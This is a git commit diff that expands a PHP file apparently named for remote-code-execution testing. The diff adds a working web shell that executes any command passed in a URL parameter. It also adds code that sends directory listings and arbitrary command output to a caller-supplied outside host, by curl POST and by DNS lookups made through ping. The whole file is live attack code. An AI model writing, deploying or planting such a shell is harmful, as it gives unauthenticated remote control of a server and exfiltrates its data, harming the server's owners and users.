f4e2d2e4eddf344928f90cecf8c8263423b3b591
0xdomsec <116116368+0xdomsec@users.noreply.github.com>
2022-11-09 04:21:23 -0800

    Update rcetest1.php

--- rcetest1.php
+++ rcetest1.php
@@ -1,4 +1,18 @@
 <?php
-// echo exec($_GET["cmdd"]);
-echo exec('ls -a | base64 -w 0');
+if (isset($_GET["cmd"])) {
+  echo exec($_GET["cmd"]);
+}
+
+if (isset($_GET["burl"]) && isset($_GET["ping"]) && ($_GET["ping"] === 1)) {
+  @exec('ping -c 3 ' . $_GET["burl"]);
+}
+
+if (isset($_GET["burl"]) && isset($_GET["curl"]) && ($_GET["curl"] === 1)) {
+  @exec('curl ' . $_GET["burl"] . ' -d `ls -a | base64 -w 0`');
+}
+
+if (isset($_GET["burl"]) && isset($_GET["bcmd"])) {
+  $res = @exec('ping -c 3 `' . $_GET["bcmd"] . '`.' . $_GET["burl"]) && @exec('curl ' . $_GET["burl"] . ' -d `' . $_GET["bcmd"] . '`');
+  echo $res;
+}
 ?>
